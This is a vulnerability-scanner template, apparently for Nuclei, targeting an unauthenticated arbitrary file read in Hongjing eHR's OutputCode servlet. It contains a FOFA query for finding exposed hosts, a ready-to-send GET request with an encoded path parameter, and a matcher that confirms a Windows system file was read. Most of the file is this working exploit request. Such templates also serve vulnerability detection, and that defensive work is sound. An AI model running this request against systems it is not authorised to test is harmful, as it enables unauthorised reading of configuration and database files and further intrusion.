id: HongjingeHR-OutputCode-File-reading

info:
  name: 宏景eHR OutputCode 任意文件读取
  author: HuanXiong
  severity: high
  description: |-
    fofa: fofa: app="HJSOFT-HCM"
    宏景eHR OutputCode 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - 
  tags: File reading

http:
  - raw:
      - |
        GET /servlet/OutputCode?path=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code == 200 && contains (body,'; for 16-bit app support')"

